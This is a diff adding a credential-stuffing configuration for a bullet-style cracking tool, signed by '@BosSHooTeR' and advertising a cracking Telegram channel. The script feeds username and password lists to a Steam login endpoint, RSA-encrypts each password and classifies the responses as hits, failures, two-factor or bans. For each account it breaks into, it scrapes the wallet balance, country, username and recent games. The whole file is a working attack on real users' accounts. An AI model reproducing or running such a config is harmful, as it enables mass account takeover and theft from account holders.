@@ -1,0 +1,171 @@
+[SETTINGS]
+{
+  "Name": "Steam-V4 FC @BosSHooTeR",
+  "SuggestedBots": 70,
+  "MaxCPM": 0,
+  "LastModified": "2026-05-06T01:31:58.9570578-07:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@BosSHooTeR",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Steam-V4 FC @BosSHooTeR",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+REQUEST POST "https://steam-chat.com/login/getrsakey/" AutoRedirect=FALSE Multipart 
+  
+  STRINGCONTENT "donotcache: " 
+  STRINGCONTENT "username: <USER>" 
+  BOUNDARY "2103e4a7-75c1-4da5-a5e0-d95a5ee7ff23" 
+  HEADER "Host: steam-chat.com" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Content-Type: multipart/form-data; boundary=2103e4a7-75c1-4da5-a5e0-d95a5ee7ff23" 
+  HEADER "Device: f5bf4f66306d8cf2cb95d342c02a5941" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "User-Agent: okhttp/4.9.2/deviceType: BosSHooTeR; appVersion: 4.10.0; osVersion: 12; model: BosSHoooTeR" 
+  HEADER "Connection: keep-alive" 
+  HEADER "x-BosShooTeR: @BosShooTeR" 
+  HEADER "x-BosSh: @BosSh" 
+  HEADER "x-MarocainsCracking: @MarocainsCracking" 
+
+PARSE "<SOURCE>" JSON "publickey_mod" -> VAR "publickey_mod" 
+
+PARSE "<SOURCE>" JSON "publickey_exp" -> VAR "publickey_exp" 
+
+PARSE "<SOURCE>" JSON "timestamp" -> VAR "Time" 
+
+FUNCTION CurrentUnixTime -> VAR "Unix" 
+
+FUNCTION RSAPKCS1PAD2 "<publickey_mod>" "<publickey_exp>" "<PASS>" -> VAR "ENCRYPT" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<ENCRYPT>" DoesNotContain "==" 
+  KEYCHAIN Success OR 
+    KEY "<ENCRYPT>" Contains "==" 
+
+FUNCTION URLEncode "<ENCRYPT>" -> VAR "URLENCRYPT" 
+
+REQUEST POST "https://steam-chat.com/login/dologin/" AutoRedirect=FALSE 
+  CONTENT "donotcache=<Unix>&password=<URLENCRYPT>&username=<USER>&twofactorcode=&emailauth=&loginfriendlyname=&captchagid=&captcha_text=&emailsteamid=&rsatimestamp=<Time>&remember_login=false&oauth_client_id=C1F110D6&mobile_chat_client=true&BosSH=BosSH8ooTeR" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: steam-chat.com" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Content-Type: multipart/form-data; boundary=2c5d84c1-f378-4653-87ea-e29c0ac2df82" 
+  HEADER "Device: f5bf4f66306d8cf2cb95d342c02a5941" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "User-Agent: okhttp/4.9.2/deviceType: BosSHooTeR; appVersion: 4.10.0; osVersion: 12; model: BosSHoooTeR" 
+  HEADER "Connection: keep-alive" 
+  HEADER "x-BosShooTeR: @BosShooTeR" 
+  HEADER "x-BosSh: @BosSh" 
+  HEADER "x-MarocainsCracking: @MarocainsCracking" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The account name or password that you have entered is incorrect" 
+    KEY "Incorrect account name or password." 
+    KEY "am9pbiBteSB0ZWxlZ3JhbSBjaGFubmVsIDogQE1hcm9jYWluc0NyYWNraW5n" 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "requires_twofactor\":true,\"" 
+    KEY "emailauth_needed\":true" 
+  KEYCHAIN Ban OR 
+    KEY "captcha_needed\":true" 
+    KEY "<RESPONSECODE>" Contains "429" 
+
+PARSE "<SOURCE>" JSON "steamid" -> VAR "ID" 
+
+REQUEST GET "https://steamcommunity.com/profiles/<ID>/" AutoRedirect=FALSE 
+  
+  HEADER "User-Agent: okhttp/4.9.2/deviceType: BosSHooTeR; appVersion: 4.10.0; osVersion: 12; model: BosSHoooTeR" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "x-BosShooTeR: @BosShooTeR" 
+  HEADER "x-BosSh: @BosSh" 
+  HEADER "x-MarocainsCracking: @MarocainsCracking" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "BANNED" OR 
+    KEY "Your profile is being forced private due to an active Community Ban on your account" 
+
+PARSE "<SOURCE>" LR "class=\"game_name\">" "</div>" Recursive=TRUE -> VAR "ga1" 
+
+PARSE "<ga1>" LR "\">" "</a>" Recursive=TRUE CreateEmpty=FALSE -> CAP "Recent-GamesPlay" 
+
+PARSE "<SOURCE>" LR "_wallet_balance\" href=\"https://store.steampowered.com/account/store_transactions/\">" "</a>" CreateEmpty=FALSE -> CAP "Balance" 
+
+PARSE "<SOURCE>" LR ".jpg\" alt=\"" "\"" CreateEmpty=FALSE -> CAP "UserName" 
+
+PARSE "<SOURCE>" LR ";country_code&quot;:&quot;" "&quot" CreateEmpty=FALSE -> CAP "Country" 
+
+PARSE "<SOURCE>" LR "\"profile_in_game_name\">Last Online" "</div>" CreateEmpty=FALSE -> CAP "Last-Online" 
+
+REQUEST GET "https://store.steampowered.com/account/" AutoRedirect=FALSE 
+  
+  HEADER "User-Agent: okhttp/4.9.2/deviceType: BosSHooTeR; appVersion: 4.10.0; osVersion: 12; model: BosSHoooTeR" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "x-BosShooTeR: @BosShooTeR" 
+  HEADER "x-BosSh: @BosSh" 
+  HEADER "x-MarocainsCracking: @MarocainsCracking" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "</title>" 
+
+FUNCTION Constant "@BosSHooTeR" -> CAP "MADE BY" 
+
